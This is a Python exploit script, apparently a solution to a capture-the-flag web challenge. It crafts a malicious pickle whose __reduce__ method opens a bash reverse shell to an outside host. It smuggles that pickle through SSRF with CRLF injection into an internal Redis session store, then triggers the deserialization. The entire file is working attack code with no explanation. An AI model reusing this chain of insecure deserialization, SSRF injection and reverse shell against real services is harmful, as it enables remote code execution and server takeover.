import os
import pickle
import requests

class shell(object):
    def __reduce__(self):
        return (__import__('os').system, ("bash -c 'bash -i >& /dev/tcp/linux4.csie.org/1322 0>&1 '", ))

req = requests.post("https://edu-ctf.csie.org:10163", verify = False)
sid = req.cookies['session']

payload = str(pickle.dumps({'shell': shell()}))[2:-1]
payload = 'http://redis:6379/?q=HTTP/1.1\r\nset "session:' + sid + '" ' + '"' + payload + '" \r\n quit'

url = requests.post("https://edu-ctf.csie.org:10163", data={'url': payload }, cookies={'session':sid},verify=False).content

req2 = requests.get(url, verify=False)

req3 = requests.get("https://edu-ctf.csie.org:10163", cookies={'session':sid}, verify=False)
